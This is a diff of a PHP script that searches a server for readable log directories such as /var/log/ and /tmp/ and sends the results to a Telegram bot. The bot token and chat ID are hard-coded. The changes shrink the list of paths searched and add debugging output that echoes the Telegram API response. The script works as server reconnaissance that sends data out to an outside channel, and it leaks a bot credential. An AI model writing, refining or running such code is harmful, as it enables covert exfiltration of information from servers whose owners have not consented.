@@ -3,13 +3,9 @@
 $botToken = "6526444701:AAE6QMmybK5ILO1ezNHgQepF1Lz5K63ui6o"; // Replace with your Telegram Bot Token
 $chatId = "-1002080579579"; // Replace with your Telegram Chat ID
 
-// Function to search for log directories
+// Function to find log directories
 function find_log_dirs() {
-    $potential_dirs = [
-        "/var/log/", "/var/www/logs/", "/home/*/logs/", "/usr/local/apache/logs/", 
-        "/usr/local/nginx/logs/", "/tmp/logs/", "/etc/logs/", getcwd() . "/logs/"
-    ];
-    
+    $potential_dirs = ["/var/log/", "/tmp/", getcwd() . "/logs/"];
     $found_logs = [];
     foreach ($potential_dirs as $dir) {
         if (is_dir($dir) && is_readable($dir)) {
@@ -34,7 +30,6 @@ $data = [
     'parse_mode' => 'Markdown'
 ];
 
-// Send request
 $options = [
     'http' => [
         'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
@@ -45,6 +40,6 @@ $options = [
 $context = stream_context_create($options);
 $response = file_get_contents($telegramURL, false, $context);
 
-// Display a message
-echo "Log directory search complete. Results sent to Telegram.";
+// Debugging Output
+echo "Telegram API Response: <br><pre>$response</pre>";
 ?>
